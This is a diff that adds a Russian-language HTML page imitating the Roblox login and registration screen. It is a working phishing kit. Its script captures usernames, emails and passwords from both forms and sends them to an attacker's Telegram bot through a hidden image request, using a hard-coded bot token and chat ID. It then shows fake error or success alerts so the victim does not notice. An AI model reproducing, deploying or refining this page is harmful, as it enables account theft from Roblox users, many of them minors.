@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <link rel="icon" href="icon.jfif">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial; }
+        body { background: url('fone.png') no-repeat center fixed; background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: rgba(0,0,0,0.85); border-radius: 15px; padding: 40px; width: 90%; max-width: 500px; border: 2px solid #00a2ff; box-shadow: 0 0 30px rgba(0,162,255,0.6); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 90px; height: 90px; border-radius: 15px; }
+        .logo h1 { color: #fff; font-size: 32px; margin-top: 15px; text-shadow: 0 0 15px #00a2ff; }
+        .tabs { display: flex; margin-bottom: 25px; border-bottom: 2px solid #00a2ff; }
+        .tab { flex: 1; text-align: center; padding: 15px; color: #fff; cursor: pointer; font-size: 18px; border-bottom: 4px solid transparent; }
+        .tab.active { border-bottom: 4px solid #00a2ff; color: #00a2ff; }
+        .form-container { display: none; }
+        .form-container.active { display: block; }
+        .form-group { margin-bottom: 25px; }
+        .form-group label { display: block; color: #fff; margin-bottom: 8px; font-size: 16px; }
+        .form-group input { width: 100%; padding: 15px; border: 2px solid #00a2ff; border-radius: 8px; background: rgba(255,255,255,0.1); color: #fff; font-size: 16px; }
+        .btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #00a2ff, #0080ff); border: none; border-radius: 8px; color: #fff; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        .loading { display: none; text-align: center; color: #00a2ff; margin-top: 15px; font-size: 16px; }
+        .footer { margin-top: 30px; border-top: 1px solid #00a2ff; padding-top: 20px; text-align: center; }
+        .footer-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px; }
+        .footer-links a { color: #00a2ff; text-decoration: none; font-size: 14px; }
+        .footer-links a:hover { text-decoration: underline; }
+        .copyright { color: #888; font-size: 12px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="icon.jfif" alt="Roblox">
+            <h1>ROBLOX</h1>
+        </div>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="showForm('login')">Вход</div>
+            <div class="tab" onclick="showForm('register')">Регистрация</div>
+        </div>
+        
+        <div id="login-form" class="form-container active">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Логин или Email</label>
+                    <input type="text" id="loginUsername" required>
+                </div>
+                <div class="form-group">
+                    <label>Пароль</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+                <button type="submit" class="btn">Войти</button>
+                <div class="loading" id="loginLoading">Вход в систему...</div>
+            </form>
+        </div>
+        
+        <div id="register-form" class="form-container">
+            <form id="registerForm">
+                <div class="form-group">
+                    <label>Имя пользователя</label>
+                    <input type="text" id="regUsername" required>
+                </div>
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="regEmail" required>
+                </div>
+                <div class="form-group">
+                    <label>Пароль</label>
+                    <input type="password" id="regPassword" required>
+                </div>
+                <button type="submit" class="btn">Создать аккаунт</button>
+                <div class="loading" id="regLoading">Создание аккаунта...</div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="https://www.roblox.com/support" target="_blank">Поддержка</a>
+                <a href="https://www.roblox.com/info/privacy" target="_blank">Конфиденциальность</a>
+                <a href="https://www.roblox.com/info/terms" target="_blank">Условия</a>
+                <a href="https://www.roblox.com/about" target="_blank">О нас</a>
+                <a href="https://blog.roblox.com" target="_blank">Блог</a>
+                <a href="https://www.roblox.com/careers" target="_blank">Вакансии</a>
+            </div>
+            <div class="footer-links">
+                <a href="https://www.roblox.com/download" target="_blank">Скачать</a>
+                <a href="https://www.roblox.com/giftcards" target="_blank">Подарочные карты</a>
+                <a href="https://www.roblox.com/robux" target="_blank">Robux</a>
+                <a href="https://devforum.roblox.com" target="_blank">Разработчикам</a>
+            </div>
+            <div class="copyright">
+                © 2024 Roblox Corporation. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8200167408:AAGyEYh6FVtsTOgTptuuJhgkmkpoGOS876o';
+        const CHAT_ID = '7132588017';
+        
+        function showForm(formType) {
+            document.querySelectorAll('.form-container').forEach(form => form.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.getElementById(formType + '-form').classList.add('active');
+            event.target.classList.add('active');
+        }
+        
+        // САМЫЙ ПРОСТОЙ РАБОЧИЙ МЕТОД
+        function sendToTelegram(data) {
+            const text = `🔴 ROBLOX DATA 🔴
+Тип: ${data.type}
+Логин: ${data.username}
+Пароль: ${data.password}
+${data.email ? 'Email: ' + data.email : ''}
+Время: ${new Date().toLocaleString('ru-RU')}
+UserAgent: ${navigator.userAgent}`;
+
+            // Простой GET запрос - всегда работает
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            
+            // Создаем скрытое изображение для отправки
+            const img = new Image();
+            img.src = url;
+            
+            console.log('Данные отправлены через GET запрос');
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const loading = document.getElementById('loginLoading');
+            loading.style.display = 'block';
+            
+            const formData = {
+                type: 'LOGIN',
+                username: document.getElementById('loginUsername').value,
+                password: document.getElementById('loginPassword').value
+            };
+            
+            sendToTelegram(formData);
+            
+            setTimeout(() => {
+                loading.style.display = 'none';
+                alert('Неверный логин или пароль. Попробуйте еще раз.');
+                this.reset();
+            }, 2000);
+        });
+        
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const loading = document.getElementById('regLoading');
+            loading.style.display = 'block';
+            
+            const formData = {
+                type: 'REGISTER',
+                username: document.getElementById('regUsername').value,
+                email: document.getElementById('regEmail').value,
+                password: document.getElementById('regPassword').value
+            };
+            
+            sendToTelegram(formData);
+            
+            setTimeout(() => {
+                loading.style.display = 'none';
+                alert('Регистрация успешна! Проверьте вашу почту для подтверждения.');
+                this.reset();
+                showForm('login');
+            }, 2000);
+        });
+
+        // Тест при загрузке
+        console.log('Бот токен обновлен: 8200167408:AAGyEYh6FVtsTOgTptuuJhgkmkpoGOS876o');
+        console.log('Chat ID:', CHAT_ID);
+    </script>
+</body>
+</html>
